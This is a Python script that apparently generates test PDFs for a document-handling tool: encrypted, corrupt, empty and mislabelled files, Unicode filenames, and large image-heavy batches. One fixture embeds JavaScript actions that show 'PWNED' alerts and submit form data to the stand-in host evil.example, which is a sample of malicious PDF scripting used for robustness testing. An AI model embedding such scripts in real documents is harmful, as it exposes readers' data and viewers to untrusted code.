import os, io, random
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4
from pypdf import PdfReader, PdfWriter
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, NumberObject, FloatObject
from PIL import Image
def simple(path, n, w, label):
    c=canvas.Canvas(path,pagesize=(w,600))
    for i in range(n): c.drawString(30,300,f"{label} page {i+1}"); c.showPage()
    c.save()
simple('base.pdf',3,350,'BASE')
# encrypted
w=PdfWriter(clone_from='base.pdf'); w.encrypt('secret',algorithm='AES-256'); w.write('protected.pdf')
w=PdfWriter(clone_from='base.pdf'); w.encrypt(user_password='',owner_password='own',algorithm='RC4-128'); w.write('owner-only-encrypted.pdf')
# corrupt
b=open('base.pdf','rb').read(); open('corrupt.pdf','wb').write(b[:len(b)//3]+os.urandom(500))
open('notpdf.pdf','wb').write(b'PK\x03\x04'+os.urandom(4000))
open('empty.pdf','wb').write(b'')
simple('เอกสารภาษาไทย_รายงาน ๒๕๖๙.pdf',2,450,'THAI')
simple('文件_ünïcødé.pdf',1,460,'UNI')
# JS + form
c=canvas.Canvas('jsform.pdf',pagesize=(370,600)); c.drawString(30,300,'JS FORM'); c.acroForm.textfield(name='f1',x=30,y=200,width=200,height=20); c.linkURL('https://example.com',(30,100,200,120)); c.showPage(); c.save()
w=PdfWriter(clone_from='jsform.pdf'); w.add_js("app.alert('PWNED-DOC'); this.submitForm('https://evil.example');")
p=w.pages[0]
js=DictionaryObject({NameObject('/S'):NameObject('/JavaScript'),NameObject('/JS'):TextStringObject("app.alert('PWNED-PAGE')")})
p[NameObject('/AA')]=DictionaryObject({NameObject('/O'):js})
annot=DictionaryObject({NameObject('/Type'):NameObject('/Annot'),NameObject('/Subtype'):NameObject('/Link'),NameObject('/Rect'):ArrayObject([FloatObject(30),FloatObject(400),FloatObject(200),FloatObject(420)]),NameObject('/A'):DictionaryObject({NameObject('/S'):NameObject('/JavaScript'),NameObject('/JS'):TextStringObject("app.alert('PWNED-LINK')")})})
w.add_annotation(0,annot)
w.write('jsform.pdf')
# heavy: image pages
def heavy(path,n,w,kb):
    c=canvas.Canvas(path,pagesize=(w,800))
    for i in range(n):
        side=int((kb*1024/3)**.5)
        im=Image.frombytes('RGB',(side,side),os.urandom(side*side*3)); bio=io.BytesIO(); im.save(bio,'PNG'); bio.seek(0)
        from reportlab.lib.utils import ImageReader
        c.drawImage(ImageReader(bio),10,10,width=w-20,height=700); c.drawString(20,780,f"{path} p{i+1}"); c.showPage()
    c.save()
os.makedirs('uat30',exist_ok=True)
# 30 files ~34MB, 69 pages
pages=[2,3,2,3,2]*6; pages[0]+=3-sum(pages)+69 if False else 0
tot=0
for i in range(30):
    n=[2,2,3][i%3]-(1 if i==0 else 0)
    heavy(f'uat30/f{i+1:02d}.pdf',n,300+i,int(920/n)); 
os.makedirs('big',exist_ok=True)
for i in range(10): heavy(f'big/b{i+1:02d}.pdf',50,300+i*7,150)
